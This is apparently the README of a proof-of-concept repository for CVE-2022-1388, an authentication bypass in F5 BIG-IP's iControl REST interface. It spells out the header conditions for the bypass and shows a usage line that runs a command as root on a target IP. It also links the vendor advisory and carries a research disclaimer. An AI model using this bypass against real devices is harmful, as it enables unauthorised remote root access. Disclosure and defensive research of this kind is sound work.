# CVE-2022-1388
POC for CVE-2022-1388 affecting multiple F5 products.

## Follow the Horizon3.ai Attack Team on Twitter for the latest security research:
*  [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)
*  [James Horseman](https://twitter.com/JamesHorseman2)
*  [Zach Hanley](https://twitter.com/hacks_zach)

## Technical Analysis
A technical root cause analysis of the vulnerability can be found on our blog: 
https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/

## Summary
Necessary conditions of a request for exploiting this vulnerability:
1. Connection header must include X-F5-Auth-Token
2. X-F5-Auth-Token header must be present
3. Host header must be localhost / 127.0.0.1 or the Connection header must include X-Forwarded-Host
4. Auth header must be set with the admin username and any password

![image](https://github.com/lfz97/CVE-2022-1388-F5-BIG-IP-RCE/blob/main/request.png)

## Usage
```bash
root@kali:/home/dev# python3 CVE-2022-1388.py -t 192.168.0.221 -c id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
```

## Mitigations
Update to the latest version or mitigate by following the instructions within the F5 Security Advisory
* https://support.f5.com/csp/article/K23605346

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.
